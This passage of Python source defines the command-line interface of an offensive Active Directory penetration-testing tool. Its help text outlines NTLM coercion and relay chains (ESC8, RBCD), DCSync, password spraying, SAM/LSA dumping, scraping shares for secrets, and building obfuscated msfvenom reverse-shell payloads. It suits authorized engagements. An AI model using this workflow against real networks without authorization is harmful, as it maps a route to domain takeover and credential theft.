    """The full set of ctx-collection args shared by ``chain run``,
    ``chain walk``, and ``chain resume``. Extracted so all three
    subcommands surface identical --help text — an operator
    reading ``chain resume --help`` sees the same flag docs they
    saw on ``chain run --help`` rather than a bare list of names."""
    parser.add_argument(
        "--probe-port", type=int, default=445,
        help="reachability probe TCP port (default: 445 for SMB)")
    parser.add_argument(
        "--probe-timeout", type=float, default=3.0,
        help="reachability probe timeout in seconds (default: 3.0)")
    parser.add_argument(
        "--listener", metavar="SMB_URI",
        help="SMB URI the coerce points at (e.g. "
             r"\\10.0.0.5\share). Skip when passing "
             "--listener-ip + --ca — fieldkit builds the URI "
             "from the bound listener automatically.")
    parser.add_argument(
        "--listener-ip", metavar="IP",
        help="fieldkit host IP the target can reach (for "
             "spawning the ntlmrelayx listener).")
    parser.add_argument(
        "--ca", metavar="HOST",
        help="ADCS CA host for esc8's relay target (e.g. "
             "ca01.corp.local).")
    parser.add_argument(
        "--template", metavar="NAME", default="DomainController",
        help="ADCS certificate template (default: "
             "DomainController; the esc8 canonical).")
    parser.add_argument(
        "--relay-port-smb", type=int, default=445, metavar="PORT",
        help="SMB bind port for the relay listener "
             "(default 445 needs root; try 4445 as non-root).")
    parser.add_argument(
        "--relay-port-http", type=int, default=80, metavar="PORT",
        help="HTTP bind port for the relay listener (default 80).")
    parser.add_argument(
        "--relay-capture-timeout", type=float, default=60.0,
        metavar="S",
        help="how long to wait for the caught auth after the "
             "coerce fired (default 60s).")
    parser.add_argument(
        "--domain", metavar="AD_DOMAIN",
        help="AD domain for post-relay steps (PKINIT + DCSync); "
             "e.g. CORP.LOCAL.")
    parser.add_argument(
        "--relay-mode", metavar="MODE",
        choices=("adcs-cert", "ldap-rbcd", "smb-exec", "socks"),
        help="ntlmrelayx relay flavor: adcs-cert (esc8), "
             "ldap-rbcd (rbcd), smb-exec (smb-relay-exec), "
             "socks. Inferred from --ca for esc8.")
    parser.add_argument(
        "--relay-target", metavar="HOST",
        help="host to relay caught auth to. DC for rbcd, "
             "workstation for smb-relay-exec. --ca implies "
             "this for esc8.")
    parser.add_argument(
        "--impersonate", metavar="USER", default="Administrator",
        help="account to impersonate via S4U2Self (rbcd "
             "profile; default Administrator).")
    parser.add_argument(
        "--dc-ip", metavar="IP",
        help="DC IP for post:s4u2self KDC round-trip "
             "(rbcd profile); defaults to chain target.")
    parser.add_argument(
        "--cred-id", type=int, metavar="ID",
        help="credential id to use for auth to the target's "
             "MS-EFSR endpoint (see `fieldkit list creds`); "
             "modern DCs require it.")


def _build_chain_parser(sub):
    """Wire the ``chain`` subcommand tree (plan / run / walk /
    resume / list / show / visual / lint). Extracted from
    ``build_parser`` so growth of the chain family doesn't
    inflate the top-level parser function."""
    p_chain = sub.add_parser(
        "chain",
        help="orchestrate multi-step coerce chains (ESC8, RBCD, SMB-relay-exec, ESC1)",
        description="fieldkit's charter piece: coerce a target to authenticate to a "
                    "fieldkit-hosted relay, then walk the outcome (cert, TGT, RBCD ACL) "
                    "into DA. Actions: plan (preview), run (walk unattended), walk "
                    "(interactive), resume (pick up an in_progress chain), show / "
                    "visual (inspect a recorded chain), list (browse), lint (audit "
                    "the profile catalog).")
    chain_sub = p_chain.add_subparsers(dest="chain_command", metavar="<action>")

    from . import chain as _chain_mod
    _chain_choices = _chain_mod.known_profiles() or ["esc8"]

    c_plan = chain_sub.add_parser(
        "plan", help="show the ordered steps of a chain profile without firing")
    c_plan.add_argument("profile", choices=_chain_choices,
                        help="chain profile to plan")
    c_plan.add_argument("target", help="chain target (DC IP for esc8, etc.)")
    c_plan.set_defaults(func=cmd_chain_plan)

    c_run = chain_sub.add_parser(
        "run", help="walk every step of a chain profile against a target")
    c_run.add_argument("profile", choices=_chain_choices, help="chain profile to run")
    c_run.add_argument("target", help="chain target (DC IP for esc8, etc.)")
    _add_chain_ctx_args(c_run)
    c_run.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    c_run.set_defaults(func=cmd_chain_run)

    c_list = chain_sub.add_parser(
        "list", help="every recorded chain in this engagement, newest first")
    c_list.add_argument("--profile", choices=_chain_choices,
                        help="filter to one profile (default: all)")
    c_list.set_defaults(func=cmd_chain_list)

    c_show = chain_sub.add_parser(
        "show", help="the per-step trail of one recorded chain")
    c_show.add_argument("chain_id", type=int, help="chain id from `fieldkit chain list`")
    c_show.add_argument("--signals", action="store_true",
                        help="show the per-step detection-signal breakdown "
                             "(event IDs, RPC opcodes, ticket requests)")
    c_show.set_defaults(func=cmd_chain_show)

    c_visual = chain_sub.add_parser(
        "visual", help="render a compact kill-chain visualization of one chain")
    c_visual.add_argument("chain_id", type=int,
                          help="chain id from `fieldkit chain list`")
    c_visual.add_argument("--html", action="store_true",
                           help="emit an inline-styled HTML block instead "
                                "of ASCII — embeddable in a report, "
                                "shareable as a standalone page")
    c_visual.add_argument("--out", metavar="PATH",
                           help="write to file instead of stdout "
                                "(useful with --html)")
    c_visual.set_defaults(func=cmd_chain_visual)

    c_export = chain_sub.add_parser(
        "export",
        help="dump one chain as JSON (id/profile/target/status/steps)",
        description="Read-only: emits the chain row + step trail as "
                    "a structured JSON object. Shape matches the "
                    "chain_history collector the report renderer uses, "
                    "so a `chain export N > chain-N.json` doubles as a "
                    "portable snapshot for post-engagement analysis or "
                    "hand-off to another tool.")
    c_export.add_argument("chain_id", type=int,
                           help="chain id from `fieldkit chain list`")
    c_export.add_argument("--out", metavar="PATH",
                           help="write to file instead of stdout")
    c_export.set_defaults(func=cmd_chain_export)

    c_walk = chain_sub.add_parser(
        "walk",
        help="interactive walker — pauses before each step for operator "
             "confirm (go/skip/quit)")
    c_walk.add_argument("profile", choices=_chain_choices, help="chain profile")
    c_walk.add_argument("target", help="chain target")
    _add_chain_ctx_args(c_walk)
    c_walk.set_defaults(func=cmd_chain_walk)

    c_resume = chain_sub.add_parser(
        "resume",
        help="pick up an in_progress chain from where the previous walk stopped",
        description="Reconstructs a Chain from the persisted trail and hands "
                    "it to the same interactive walker as `chain walk`. Only "
                    "in_progress chains are resumable; proven/aborted chains "
                    "surface a hard error rather than a silent re-walk.")
    c_resume.add_argument("chain_id", type=int,
                           help="chain id from `fieldkit chain list` (must be in_progress)")
    _add_chain_ctx_args(c_resume)
    c_resume.add_argument("-y", "--yes", action="store_true",
                           help="skip the confirm-back")
    c_resume.set_defaults(func=cmd_chain_resume)

    c_lint = chain_sub.add_parser(
        "lint",
        help="coverage audit of every registered chain profile "
             "(missing signals, duplicate step names, preflight order)",
        description="Read-only audit of the shipped chain-profile catalog. "
                    "Surfaces gaps that would understate detection debt or "
                    "break the walker's semantic contract. Exit codes: "
                    "0 clean, 1 warnings, 2 errors.")
    c_lint.add_argument("--profile",
                         help="audit a single profile (default: every profile)")
    c_lint.add_argument("--json", action="store_true",
                         help="emit machine-readable JSON (findings + summary); "
                              "nothing else on stdout. Exit codes match the "
                              "text mode (0 clean, 1 warnings, 2 errors), so "
                              "CI can gate on the exit code directly.")
    c_lint.set_defaults(func=cmd_chain_lint)

    c_register = chain_sub.add_parser(
        "register",
        help="install a YAML-defined chain profile so it auto-loads",
        description="Copies a YAML profile into ~/.fieldkit/chains/ "
                    "so it auto-loads on subsequent fieldkit invocations. "
                    "Validates the YAML first — a bad file never lands "
                    "in the auto-load dir. See fieldkit/chain_yaml.py "
                    "for the schema; the shipped profiles' YAML shape "
                    "is a good starting template.")
    c_register.add_argument("--from-yaml", required=True, metavar="PATH",
                             help="path to the YAML chain profile")
    c_register.set_defaults(func=cmd_chain_register)

    c_unregister = chain_sub.add_parser(
        "unregister",
        help="remove a user-installed chain profile (shipped profiles kept)")
    c_unregister.add_argument("name",
                                help="profile name from `chain list-profiles`")
    c_unregister.set_defaults(func=cmd_chain_unregister)

    c_list_profiles = chain_sub.add_parser(
        "list-profiles",
        help="registered chain profiles — shipped + user-installed")
    c_list_profiles.set_defaults(func=cmd_chain_list_profiles)


def _build_ttps_parser(sub):
    """Wire the ``ttps`` subcommand tree (list / show). Extracted
    from ``build_parser`` for parity with the other subcommand-group
    helpers."""
    p_ttps = sub.add_parser(
        "ttps", help="browse the shipped TTP catalog (list / show)",
        description="fieldkit ships a YAML catalog of TTPs (technique + "
                    "detect + execute + verify + report + playbook). This "
                    "command surfaces the catalog without hunting through "
                    "the source tree.")
    ttps_sub = p_ttps.add_subparsers(dest="ttps_command", metavar="<action>")
    tt_list = ttps_sub.add_parser(
        "list", help="one row per TTP (technique, key, platform, ranking)")
    tt_list.add_argument("--grep", metavar="STR",
                          help="case-insensitive substring filter over "
                               "key / name / technique / tactic / "
                               "vector_type")
    tt_list.set_defaults(func=cmd_ttps_list)
    tt_show = ttps_sub.add_parser(
        "show", help="pretty-print one TTP by key")
    tt_show.add_argument("key", help="TTP key from `fieldkit ttps list`")
    tt_show.set_defaults(func=cmd_ttps_show)

    tt_validate = ttps_sub.add_parser(
        "validate",
        help="validate a YAML TTP file (or a dir of them) against the loader schema",
        description="Runs the shipped fieldkit.ttps.loader against a file "
                    "or every .yaml in a directory. Prints per-file OK/ERR; "
                    "exit 2 if any file fails. Useful pre-flight before "
                    "landing a new TTP so a schema error surfaces without "
                    "polluting the shipped catalog.")
    tt_validate.add_argument(
        "path", help="path to a YAML TTP file, or a directory to walk")
    tt_validate.set_defaults(func=cmd_ttps_validate)

    p_ttps.set_defaults(func=lambda a: _missing(p_ttps))


def _build_session_parser(sub):
    """Wire the ``session`` subcommand tree (log / show / replay)."""
    from . import session as session_mod
    p_session = sub.add_parser(
        "session",
        help="record + replay: every fieldkit invocation as a JSONL log",
        description="Opt-in session recording — export "
                    f"{session_mod.ENV_VAR}=<path> and every subsequent "
                    "`fieldkit ...` call appends its argv + exit code + "
                    "duration to that file. `session log --enable` prints "
                    "the export line for eval; `session show` renders a "
                    "log; `session replay` re-runs each entry in order.")
    sess_sub = p_session.add_subparsers(dest="session_command",
                                           metavar="<action>")

    s_log = sess_sub.add_parser(
        "log", help="show / enable / disable recording (prints eval line)")
    s_log_group = s_log.add_mutually_exclusive_group()
    s_log_group.add_argument("--enable", action="store_true",
                              help="print the export line to eval "
                                   "(with --out to name the file)")
    s_log_group.add_argument("--disable", action="store_true",
                              help="print the unset line to eval")
    s_log.add_argument("--out", metavar="PATH",
                        help="log path when enabling (default: "
                             "fieldkit-session.jsonl in CWD)")
    s_log.set_defaults(func=cmd_session_log)

    s_show = sess_sub.add_parser(
        "show", help="pretty-print the entries in a session log")
    s_show.add_argument("log", help="path to the JSONL log")
    s_show.add_argument("--json", action="store_true",
                         help="emit raw JSONL (pipe-friendly)")
    s_show.set_defaults(func=cmd_session_show)

    s_replay = sess_sub.add_parser(
        "replay", help="re-run every entry in a session log",
        description="Re-executes each recorded invocation in order, "
                    "in-process (same argparse + handler path a live "
                    "invocation takes). Use --dry-run to preview.")
    s_replay.add_argument("log", help="path to the JSONL log")
    s_replay.add_argument("--dry-run", action="store_true",
                           help="print what would run without executing")
    s_replay.set_defaults(func=cmd_session_replay)

    p_session.set_defaults(func=lambda a: _missing(p_session))


def _build_bloodhound_parser(sub):
    """Wire the ``bloodhound`` subcommand tree (import / suggest)."""
    p_bh = sub.add_parser("bloodhound", help="ingest SharpHound data + find owned→DA paths")
    bh_sub = p_bh.add_subparsers(dest="bloodhound_command", metavar="<action>")
    b_import = bh_sub.add_parser(
        "import", help="load SharpHound JSON (zip/dir) and path-find from owned creds",
        description="Stores the AD control graph (MemberOf/AdminTo/dangerous ACEs) and "
                    "reports which owned principals reach a high-value target.")
    b_import.add_argument("path", help="SharpHound .zip, a directory of JSON, or a .json")
    b_import.set_defaults(func=cmd_bloodhound_import)

    b_suggest = bh_sub.add_parser(
        "suggest",
        help="for each owned→high-value path, suggest a chain profile that lands it",
        description="Reads the ingested BH graph, enumerates the shortest "
                    "path from each owned principal to a high-value target, "
                    "and where a shipped chain profile fits the path shape, "
                    "prints the exact `chain run` command to walk it. "
                    "Read-only.")
    b_suggest.add_argument("--all-paths", action="store_true",
                            help="surface every distinct high-value target "
                                 "reachable per owned principal, not just "
                                 "the shortest (capped by --max-paths). "
                                 "Default: one path per owned principal.")
    b_suggest.add_argument("--max-paths", type=int, default=5, metavar="N",
                            help="with --all-paths: cap per source principal "
                                 "(default: 5)")
    b_suggest.set_defaults(func=cmd_bloodhound_suggest)

    p_bh.set_defaults(func=lambda a: _missing(p_bh))


def build_parser():
    parser = argparse.ArgumentParser(
        prog=PROG,
        description="Stateful internal-AD execution engine. Authorized engagements only.")
    parser.add_argument("--version", action="version", version=f"{PROG} {__version__}")
    parser.add_argument("--db", metavar="PATH",
                        help=f"engagement database (default: ${DB_ENV_VAR} or ./engagement.db)")
    sub = parser.add_subparsers(dest="command", metavar="<command>")

    p_init = sub.add_parser("init", help="create ./engagement.db")
    p_init.add_argument("name", nargs="?", help="engagement name (default: directory name)")
    p_init.set_defaults(func=cmd_init)

    p_config = sub.add_parser("config", help="engagement config (lhost/lport/domain/…)")
    config_sub = p_config.add_subparsers(dest="config_command", metavar="<action>")

    c_show = config_sub.add_parser("show", help="print every key")
    c_show.set_defaults(func=cmd_config_show)

    c_get = config_sub.add_parser("get", help="print one key")
    c_get.add_argument("key")
    c_get.set_defaults(func=cmd_config_get)

    c_set = config_sub.add_parser("set", help="set keys, e.g. lhost=10.10.14.7 lport=443")
    c_set.add_argument("assignments", nargs="+", metavar="key=value")
    c_set.add_argument("--subnet", metavar="CIDR",
                       help="scope this lhost to one segment (per-subnet override)")
    c_set.set_defaults(func=cmd_config_set)

    c_unset = config_sub.add_parser("unset", help="remove a key or a subnet override")
    c_unset.add_argument("key", nargs="?")
    c_unset.add_argument("--subnet", metavar="CIDR")
    c_unset.set_defaults(func=cmd_config_unset)
    p_config.set_defaults(func=cmd_config_show)  # bare `config` shows everything

    p_add = sub.add_parser("add", help="add credentials or hosts")
    add_sub = p_add.add_subparsers(dest="add_command", metavar="<what>")

    a_cred = add_sub.add_parser(
        "cred", help="add a credential in whatever form you have it",
        description="""Pass the credential the way you already have it — the parser
autodetects the shape and picks the right auth flow.

Examples (just quote the whole thing):

  fieldkit add cred 'jdoe:Winter2025!'                    (plain user + password)
  fieldkit add cred 'CORP/jdoe:Winter2025!'               (domain user + password)
  fieldkit add cred 'CORP\\jdoe:Winter2025!'                 (Windows-style domain)
  fieldkit add cred 'jdoe@corp.local:Winter2025!'         (UPN)
  fieldkit add cred '.\\Administrator:P@ss'                  (local account, -> --local-auth)
  fieldkit add cred 'jdoe:31d6cfe0d16ae931b73c59d7e0c089c0' (NT hash — autodetected)
  fieldkit add cred 'jdoe:aad3b435...ee:31d6cfe...c0'     (LM:NT hash pair)
  fieldkit add cred ':31d6cfe0d16ae931b73c59d7e0c089c0' --user Administrator --local

The individual flags below (--user, --hash, --password, ...) are only needed when
the spec is missing that field. `--from-file` reads one credential per line.
`--source` tags the audit trail on the report (default: manual).""",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    a_cred.add_argument("spec", nargs="?", metavar="CREDENTIAL",
                        help="the credential as you have it — see examples above")
    a_cred.add_argument("--user", help="username, when the spec has none")
    a_cred.add_argument("--domain", help="AD domain (overrides the spec)")
    a_cred.add_argument("--password", help="password, when the spec has none")
    a_cred.add_argument("--hash", help="NT hash (or LM:NT)")
    a_cred.add_argument("--aes", help="Kerberos AES128/256 key (hex)")
    a_cred.add_argument("--ccache", help="path to a Kerberos ccache")
    a_cred.add_argument("--ssh-key", dest="ssh_key", help="path to an SSH private key")
    a_cred.add_argument("--local", action="store_true",
                        help="local account (tools get --local-auth, not -d)")
    a_cred.add_argument("--source", default="manual",
                        help="where it came from: manual/spray/sam/lsa/gpp/ntds/… (default: manual)")
    a_cred.add_argument("--from-file", metavar="FILE", help="one credential per line")
    a_cred.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    a_cred.set_defaults(func=cmd_add_cred)

    a_hosts = add_sub.add_parser("hosts", help="add scope: IPs, CIDRs, or a scope file")
    a_hosts.add_argument("targets", nargs="*", help="IP, CIDR, or a path to a scope file")
    a_hosts.add_argument("--file", help="scope file (one entry per line)")
    a_hosts.add_argument("--os", choices=["windows", "linux", "other"], help="record the OS")
    a_hosts.add_argument("--dc", action="store_true", help="mark these as domain controllers")
    a_hosts.add_argument("--subnet", help="override the derived subnet label")
    a_hosts.add_argument("--max-expand", type=int, default=scope_mod.DEFAULT_MAX_EXPAND,
                         help="max hosts one CIDR may expand to (default: %(default)s)")
    a_hosts.set_defaults(func=cmd_add_hosts)
    p_add.set_defaults(func=lambda a: _missing(p_add))

    p_scope = sub.add_parser(
        "scope", help="engagement scope rules (allow/deny CIDRs)",
        description="Optional engagement-scope enforcement. With no rules, every "
                    "IP is allowed (backward-compat: an engagement that never sets "
                    "up scope rules works as it always did). Add allow rules to "
                    "narrow the engagement to specific CIDRs; add deny rules to "
                    "carve exceptions. Deny always wins. `add hosts` refuses IPs "
                    "outside scope; commands taking a single IP report the exact "
                    "scope violation rather than 'not in scope' being confused "
                    "with 'not in the engagement database'.")
    scope_sub = p_scope.add_subparsers(dest="scope_command", metavar="<action>")
    s_show = scope_sub.add_parser("show", help="list the current rules")
    s_show.set_defaults(func=cmd_scope_show)
    s_allow = scope_sub.add_parser(
        "allow", help="add one or more allow CIDRs (narrows the scope)",
        description="Everything OUTSIDE these CIDRs is rejected. Add several by "
                    "listing them; each is normalized (10.0.0.5/24 -> 10.0.0.0/24).")
    s_allow.add_argument("cidrs", nargs="+", metavar="CIDR", help="CIDR to allow")
    s_allow.add_argument("--notes", metavar="TEXT", help="engagement notes for this rule")
    s_allow.set_defaults(func=cmd_scope_add, deny=False)
    s_deny = scope_sub.add_parser(
        "deny", help="add one or more deny CIDRs (carve exceptions)",
        description="Carve an exception out of a broader allow. E.g. 10.0.0.0/16 "
                    "allowed + 10.0.10.0/24 denied = the /16 minus the /24.")
    s_deny.add_argument("cidrs", nargs="+", metavar="CIDR", help="CIDR to deny")
    s_deny.add_argument("--notes", metavar="TEXT", help="engagement notes for this rule")
    s_deny.set_defaults(func=cmd_scope_add, deny=True)
    s_clear = scope_sub.add_parser("clear", help="drop every scope rule (enforcement OFF)")
    s_clear.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    s_clear.set_defaults(func=cmd_scope_clear)
    p_scope.set_defaults(func=lambda a: _missing(p_scope))

    p_ingest = sub.add_parser("ingest", help="fold captured tool output into state")
    ingest_sub = p_ingest.add_subparsers(dest="ingest_command", metavar="<tool>")
    i_nxc = ingest_sub.add_parser(
        "nxc", help="record a saved netexec capture (valid creds + (Pwn3d!) access)",
        description="Reads nxc output from a file or stdin, records every [+] "
                    "credential and (Pwn3d!) admin result, and enriches scope from "
                    "the [*] banners. The offline twin of `fieldkit spray`.")
    i_nxc.add_argument("file", nargs="?", help="capture file (default: stdin)")
    i_nxc.add_argument("--source", default="spray",
                       help="where these results came from (default: spray)")
    i_nxc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    i_nxc.set_defaults(func=cmd_ingest_nxc)

    i_nmap = ingest_sub.add_parser(
        "nmap", help="record hosts + open services from an nmap scan (XML / normal / grepable)",
        description="Reads nmap output and folds every up host + open service "
                    "into the engagement. Format auto-detects: -oX (xml, "
                    "richest — includes OS detection), -oN (normal, the default "
                    "human-readable text), -oG (grepable, single-line-per-host). "
                    "Respects scope rules — out-of-scope IPs drop with a warning. "
                    "Idempotent: re-ingesting the same scan doesn't duplicate.")
    i_nmap.add_argument("file", nargs="?",
                        help="nmap output file (any of -oX / -oN / -oG), or `-`/stdin "
                             "(`nmap -oX - <targets> | fieldkit ingest nmap -`)")
    i_nmap.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    i_nmap.set_defaults(func=cmd_ingest_nmap)

    i_hashcat = ingest_sub.add_parser(
        "hashcat", help="promote cracked hashes from a hashcat potfile to credentials",
        description="Reads a hashcat potfile (one `<hash>:<plaintext>` per line), "
                    "matches each cracked hash against loot we already dumped "
                    "(SAM/NTDS/LSA), and promotes matches to full credentials "
                    "ready to spray. Hashes without a loot match are kept as a "
                    "`cracked_hash` loot row so a later dump can attribute them.")
    i_hashcat.add_argument("file", nargs="?",
                           help="hashcat potfile (or `-` / stdin)")
    i_hashcat.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    i_hashcat.set_defaults(func=cmd_ingest_hashcat)

    i_recce = ingest_sub.add_parser(
        "recce", help="ingest a recce-bridge.json (recce -> fieldkit handoff)",
        description="Reads `recce-bridge.json` (written by `recce fieldkit-export`) "
                    "and folds recce's confirmed findings + per-host services into "
                    "state, so `fieldkit analyze` promotes recce-confirmed hosts "
                    "above unranked ones. Idempotent: re-ingesting an updated "
                    "bridge upserts rather than duplicates. "
                    "Version pinned on _recce_bridge major "
                    f"{recce_mod.BRIDGE_MAJOR}.")
    i_recce.add_argument("file", nargs="?",
                         help="recce-bridge.json path (or `-` / stdin)")
    i_recce.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    i_recce.set_defaults(func=cmd_ingest_recce)

    p_ingest.set_defaults(func=lambda a: _missing(p_ingest))

    p_spray = sub.add_parser(
        "spray", help="validate stored creds across scope and run the credential loop",
        description="Sprays every stored credential across the scope on one protocol, "
                    "records who is valid and who is admin ((Pwn3d!)), dumps SAM+LSA on "
                    "owned hosts, promotes recovered secrets to credentials, and repeats "
                    "until dry. Reuses each account's own proven secret, so it cannot "
                    "lock a domain account.")
    p_spray.add_argument("proto", nargs="?", default="smb",
                         help=f"protocol: {', '.join(spray_mod.PROTOCOLS)} (default: smb)")
    p_spray.add_argument("--subnet", metavar="CIDR", help="limit to one segment")
    p_spray.add_argument("--dc", metavar="IP", help="read the lockout policy from this DC")
    # one-shot ergonomics: add hosts inline / auto-create a temp engagement.
    # The tester who wants "just spray these IPs once" gets it in one command.
    p_spray.add_argument("--hosts", nargs="+", metavar="IP|CIDR",
                         help="add these hosts to the engagement before spraying "
                              "(skips the separate `add hosts` step)")
    p_spray.add_argument("--tmp", action="store_true",
                         help="one-shot mode: create a fresh engagement under /tmp for "
                              "this run (records evidence there; inspect later with "
                              "`fieldkit --db <that-path> status`)")
    p_spray.add_argument("--no-loot", action="store_true",
                         help="do not dump SAM/LSA on owned hosts")
    p_spray.add_argument("--no-policy", action="store_true",
                         help="skip reading the domain password policy first")
    p_spray.add_argument("--timeout", type=int, default=600,
                         help="per-command timeout in seconds (default: %(default)s)")
    p_spray.add_argument("-y", "--yes", action="store_true",
                         help="run without the confirm-back")
    # wordlist-spray mode: switches from "stored creds, safe by construction" to
    # "user × password combos, CAN lock accounts if the lockout policy is respected."
    p_spray.add_argument("--wordlist", action="store_true",
                         help="run wordlist × password spray instead of stored-cred spray "
                              "(uses --userlist / --passlist, or the config keys)")
    p_spray.add_argument("--userlist", metavar="FILE",
                         help="path to a userlist for --wordlist (overrides config userlist)")
    p_spray.add_argument("--passlist", metavar="FILE",
                         help="path to a passlist for --wordlist (overrides config passlist)")
    p_spray.add_argument("--allow-lockout-risk", action="store_true",
                         help="proceed with --wordlist even when the passlist exceeds the "
                              "lockout policy's safe attempts per window (accepts the risk)")
    p_spray.set_defaults(func=cmd_spray)

    p_spider = sub.add_parser(
        "spider", help="spider readable SMB shares, scrub files for secrets, promote creds",
        description="Drives `nxc smb -M spider_plus` against one host: downloads every "
                    "file under 50KB from every readable share and scrubs the corpus "
                    "against an inspectable ruleset (GPP cpassword, unattend.xml, "
                    "web.config, key=value scripts, sensitive filenames). Every hit is "
                    "loot; a plaintext user+password (GPP, unattend, .ps1 -Password) is "
                    "promoted straight into the credential loop. Holding a bulk copy of "
                    "the client's files is recorded as a deletion obligation in the "
                    "cleanup manifest so the report says so.")
    p_spider.add_argument("host", metavar="HOST",
                          help="target IP/hostname (must be a Windows SMB service)")
    p_spider.add_argument("--out", metavar="DIR",
                          help="local download folder (default: build/spider-<host>/)")
    p_spider.add_argument("--no-promote", action="store_true",
                          help="record hits as loot only, do not promote to credentials")
    p_spider.add_argument("-y", "--yes", action="store_true",
                          help="run without the confirm-back")
    p_spider.set_defaults(func=cmd_spider)

    p_scrub = sub.add_parser(
        "scrub", help="on-box filesystem scrub of a Linux foothold for cleartext secrets",
        description="Same scrubbers as `spider`, but against the local filesystem of a "
                    "Linux foothold you already own. One `find | cat` pipeline sweeps "
                    "/etc, /opt, $HOME, /var/www (or the paths you pass) for config "
                    "files that carry credentials (kv-secret, dotenv, YAML), sensitive "
                    "filenames (id_rsa, .env, .git-credentials, .pfx), and web.config "
                    "connection strings. Recovered credentials are promoted; the rest "
                    "become loot. Read-only against the target.")
    p_scrub.add_argument("host", metavar="HOST",
                         help="target IP/hostname (must be a Linux foothold with proven access)")
    p_scrub.add_argument("paths", nargs="*", metavar="PATH",
                         help="paths to scrub (default: /etc /opt /root /home /var/www /srv)")
    p_scrub.add_argument("-y", "--yes", action="store_true",
                         help="run without the confirm-back")
    p_scrub.set_defaults(func=cmd_scrub)

    p_analyze = sub.add_parser(
        "analyze", help="rank the next moves from what the loop has proved",
        description="Reads state and ranks privesc/lateral opportunities by "
                    "exploitability x safety x detection. Read-only — it names the "
                    "next move, it does not run it.")
    p_analyze.add_argument("--proof", action="store_true",
                           help="show each opportunity's safe-proof (report evidence)")
    p_analyze.add_argument("--refresh", metavar="BRIDGE_PATH",
                           help="re-ingest a recce-bridge.json before ranking. "
                                "Same effect as `fieldkit recce <path>` immediately "
                                "before `analyze` — but wrapped so the operator "
                                "workflow stays one command.")
    p_analyze.set_defaults(func=cmd_analyze)

    p_enum = sub.add_parser(
        "enum", help="enumerate a host you have a foothold on (read-only, captured)",
        description="Runs the OS-appropriate privesc enumeration on a host through the "
                    "read-only executor, captures every check as evidence, and prints "
                    "the signals that feed `analyze`.")
    p_enum.add_argument("host", metavar="IP", help="a host you already have access on")
    p_enum.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_enum.set_defaults(func=cmd_enum)

    p_run = sub.add_parser(
        "run", help="fire a privesc vector on a host, captured, through the safety gate",
        description="Runs one vector from `analyze` on a host. read-only vectors run "
                    "after a confirm; config-change/crash-risk vectors need an explicit "
                    "--allow. Output, the finding and any cleanup artifact are recorded.")
    p_run.add_argument("host", metavar="IP", help="the host to escalate on")
    p_run.add_argument("vector", help="the vector key from `analyze` (e.g. sudo:find)")
    p_run.add_argument("--allow", action="append",
                       choices=["config-change", "crash-risk"], metavar="LEVEL",
                       help="permit a riskier vector (repeatable)")
    p_run.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_run.set_defaults(func=cmd_run)

    p_esc = sub.add_parser(
        "escalate", help="walk the ranked vectors automatically, stopping at first proof",
        description="The orchestrator: fires the best-ranked vector on a host, classifies "
                    "the result, and follows the fallback axis — advance to the next "
                    "vector, retry a timeout, stop on proof, or halt on anything it does "
                    "not recognise. Vectors above --allow are skipped, never fired. Every "
                    "step is captured and the winning vector is recorded as a finding.")
    p_esc.add_argument("host", metavar="IP", nargs="?", help="the host to escalate on")
    p_esc.add_argument("--allow", action="append",
                       choices=["config-change", "crash-risk"], metavar="LEVEL",
                       help="permit riskier vectors in the loop (repeatable)")
    p_esc.add_argument("--max", type=int, metavar="N",
                       help=f"cap vectors fired (default {escalate_mod.DEFAULT_BUDGET})")
    p_esc.add_argument("--no-stage", action="store_true",
                       help="don't auto-stage/build a missing artifact on a miss")
    p_esc.add_argument("--dry-run", action="store_true",
                       help="print the ranked plan and exit without firing")
    p_esc.add_argument("--rules", action="store_true",
                       help="print the axis→action policy table and exit")
    p_esc.add_argument("-y", "--yes", action="store_true", help="skip the confirm-back")
    p_esc.add_argument("--refresh", metavar="BRIDGE_PATH",
                       help="re-ingest a recce-bridge.json before ranking. "
                            "Same effect as `fieldkit recce <path>` immediately "
                            "before `escalate`.")
    p_esc.set_defaults(func=cmd_escalate)

    p_poc = sub.add_parser(
        "poc", help="build a payload artifact (msi/exe/dll/so/ps1) by driving the toolchain",
        description="Drives the operator's builders (msfvenom/wixl/gcc/mingw) to produce "
                    "an artifact a vector needs. Orchestration only — the bytes come from "
                    "msfvenom or your --source; fieldkit templates benign scaffolding and "
                    "builds a whoami/id proof by default (--lhost/--lport for a revshell). "
                    "The escalate loop calls this automatically on a build-kind miss.")
    p_poc.add_argument("format", nargs="?", choices=sorted(poc_mod.RECIPES),
                       help="artifact format to build")
    p_poc.add_argument("-o", "--out", metavar="PATH", help="output path (default: ~/.fieldkit/build)")
    p_poc.add_argument("--arch", choices=["x64", "x86"], default="x64",
                       help="target arch for exe/dll (default x64)")
    p_poc.add_argument("--command", metavar="CMD",
                       help="command the artifact runs (default: a whoami/id proof)")
    p_poc.add_argument("--lhost", help="reverse-shell LHOST (msfvenom payload instead of a proof)")
    p_poc.add_argument("--lport", help="reverse-shell LPORT")
    p_poc.add_argument("--source", metavar="FILE", help="compile this .c with mingw (exe/dll)")
    p_poc.add_argument("--obfuscate", metavar="EXE",
                       help="obfuscate a compiled .NET assembly with ConfuserEx (path or arsenal name)")
    p_poc.add_argument("--confuser", metavar="PATH",
                       help="path to the ConfuserEx CLI (else config confuser_cli / PATH)")
    p_poc.add_argument("--check", action="store_true", help="report which builders are installed")
    p_poc.set_defaults(func=cmd_poc)

    p_preflight = sub.add_parser(
        "preflight", help="check which tools fieldkit drives are installed on PATH",
        description="Lists the external tools fieldkit drives (netexec + impacket are the "
                    "spine; certipy/evil-winrm/msfvenom/wixl/gcc/mingw/pandoc are "
                    "per-feature) and whether each is on PATH. Exits non-zero if a required "
                    "tool is missing.")
    p_preflight.set_defaults(func=cmd_preflight)

    p_doctor = sub.add_parser(
        "doctor",
        help="one health-check for tools + chain lint + engagement + TTPs",
        description="Runs every fieldkit self-probe (preflight, chain lint "
                    "over the shipped catalog, engagement sanity — staging "
